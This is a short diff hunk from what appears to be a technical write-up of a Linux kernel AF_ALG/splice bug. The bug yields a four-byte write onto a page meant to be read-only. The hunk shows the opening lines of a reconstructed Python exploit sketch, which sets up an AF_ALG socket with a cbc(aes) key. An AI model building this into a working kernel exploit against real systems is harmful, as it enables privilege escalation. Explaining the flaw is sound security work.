@@ -18,7 +18,6 @@ Back in 2017, an in-place optimization was added that saves a page allocation by
 So what you're left with, as a raw primitive, is a four-byte write at a controlled offset, landing on a page that was never supposed to be writable in the first place. The clever part — and this is where the original writeup really earns its keep — is that you don't have to send the tag page as part of your own `sendmsg` call. You can splice a completely different page in from wherever you'd rather it land:
 
 ```python
-# the exploit shape (reconstructed from the writeup)
 alg = socket(AF_ALG, SOCK_SEQPACKET)
 alg.bind(("skcipher", "cbc(aes)"))        # encryption...
 alg.setsockopt(SOL_ALG, ALG_SET_KEY, key)
